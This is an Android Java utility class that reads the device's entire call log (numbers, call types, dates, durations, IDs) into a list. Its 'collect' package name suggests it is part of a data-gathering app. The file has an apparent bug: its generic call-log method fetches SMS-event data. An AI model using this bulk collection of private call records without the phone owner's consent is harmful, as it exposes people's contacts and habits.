package com.xaviar.collect.calllog;

import java.util.LinkedList;
import java.util.List;

import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;

import com.xaviar.frm.DataHolder;
import com.xaviar.utils.DbUtil;

public class CallLogUtil {
	
	public static List<CallLogEntry> getCallDetails(Context ctx) {

        List<CallLogEntry> listCall = new LinkedList<CallLogEntry>();        
        Cursor c = ctx.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
// Cursor c=context.getContentResolver().query(StatusProvider.CONTENT_URI, null, null, null,StatusData.GET_ALL_ORDER_BY);
        int number = c.getColumnIndex(CallLog.Calls.NUMBER);
        int type = c.getColumnIndex(CallLog.Calls.TYPE);
        int date = c.getColumnIndex(CallLog.Calls.DATE);
        int duration = c.getColumnIndex(CallLog.Calls.DURATION);  
        int id = c.getColumnIndex(CallLog.Calls._ID);
        
        while (c.moveToNext()) {
            CallLogEntry callEnt = new CallLogEntry();
        	String phNumber = c.getString(number);
        	callEnt.setPhoneNumber(phNumber);
        	
            String callTypeTemp = c.getString(type);
            String callType = getCallType(callTypeTemp);
            callEnt.setType(callType);
            
            String callDate = c.getString(date);
            callEnt.setTimeSeconds(callDate);
           // Date callDayTime = new Date(Long.valueOf(callDate));
           // callEnt.setTimeSeconds(callDayTime.toString());
            String callDuration = c.getString(duration);
            callEnt.setDuration(callDuration);
            
            String callID = c.getString(id);
            //String idStr = String.valueOf(id);
            callEnt.setId(callID);
            listCall.add(callEnt);
        }
        c.close();
        return listCall;

    }

	private static String getCallType(String callTypeTemp) {
		  String dir = null;
          int dircode = Integer.parseInt(callTypeTemp);
          switch (dircode) {
          case CallLog.Calls.OUTGOING_TYPE:
              dir = "OUTGOING";
              break;

          case CallLog.Calls.INCOMING_TYPE:
              dir = "INCOMING";
              break;

          case CallLog.Calls.MISSED_TYPE:
              dir = "MISSED";
              break;
          }
         return dir; 
	}
	
	public static String getAllCallLogGeneric(Context ctx) {
		 String  genericData = DbUtil.getAllGeneric(ctx,DataHolder.SMS_EVENT);
		return genericData;
	}
}
